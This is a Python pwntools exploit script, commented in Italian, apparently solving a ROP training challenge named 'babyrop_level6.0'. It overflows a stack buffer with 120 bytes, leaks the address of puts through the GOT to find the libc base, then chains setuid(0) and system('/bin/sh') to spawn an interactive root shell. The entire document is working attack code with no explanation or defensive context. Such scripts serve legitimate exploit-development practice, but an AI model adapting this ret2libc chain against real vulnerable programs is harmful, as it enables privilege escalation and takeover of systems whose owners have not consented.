from pwn import *

elf = ELF('/challenge/babyrop_level6.0')


# 📌 Step 1: Ottenere un Leak di un Indirizzo della libc
rop1 = ROP(elf)

pop_rdi = rop1.rdi.address
got_puts = elf.got.puts
plt_puts = elf.plt.puts
chall = elf.sym.challenge
ret = rop1.ret.address

rop1.raw(p64(pop_rdi))
rop1.raw(p64(got_puts))
rop1.raw(p64(plt_puts))
rop1.raw(p64(chall))

proc = process('/challenge/babyrop_level6.0')
proc.recvuntil(b'Programming!\n\n')

offset_ret = 120
payload = b'A' * offset_ret + rop1.chain()
proc.send(payload)

proc.recvuntil(b'Leaving!\n')
leaked_puts = u64(proc.recvline(False).ljust(8, b"\x00"))
print(f'leaked puts: {hex(leaked_puts)}')


# 📌 Step 2: Calcolare la Base della libc
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
puts_offset = libc.sym.puts
libc_base = leaked_puts - puts_offset
print(f'libc base: {hex(libc_base)}')


# 📌 Step 3: Trovare system() e "/bin/sh"
libc.address = libc_base
setuid_addr = libc.sym.setuid
system_addr = libc.sym.system
bin_sh_addr = next(libc.search(b"/bin/sh"))


# 📌 Step 4: Costruire la ROP Chain Finale -> system(bin/sh)
rop2 = ROP(elf)

pop_rdi = rop2.rdi.address
ret = rop2.ret.address

rop2.raw(p64(pop_rdi))
rop2.raw(p64(0))
rop2.raw(p64(ret))
rop2.raw(p64(setuid_addr))

rop2.raw(p64(pop_rdi))
rop2.raw(p64(bin_sh_addr))  
rop2.raw(p64(ret))
rop2.raw(p64(system_addr))
# print(rop2.dump())

print(proc.recvuntil(b'Programming!\n\n'))

offset_ret = 120
payload = b'A' * offset_ret + rop2.chain()

proc.send(payload)

sleep(3)
proc.interactive()
